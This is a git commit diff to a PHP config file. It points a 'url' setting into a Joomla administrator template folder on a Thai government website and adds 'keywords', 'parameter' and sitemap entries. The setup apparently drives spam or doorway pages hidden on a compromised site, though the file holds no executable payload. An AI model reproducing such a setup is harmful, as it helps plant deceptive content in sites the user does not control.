ed8b51b6bf37cab1b0371837827156c3c51cb779
ROIHEE <thanawat58311@gmail.com>
2024-09-18 12:41:55 +0800

    Update config.php

--- config.php
+++ config.php
@@ -1,6 +1,9 @@
 <?php
 $config = array(
-        'url'		=> 'https://www.lp-pao.go.th/Main60/media/style/',
-        'template'  => 'index.php',
-        'sitemap'	=> 'sitemap.xml'
+  	'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/templates/hathor/html/com_admin/sysinfo/asia/',
+	'parameter' => 'go',
+	'template'  => 'temp.html',
+	'keywords'  => 'bb.txt',
+	'sitemap'	=> 'gg.xml'
 );
+?>
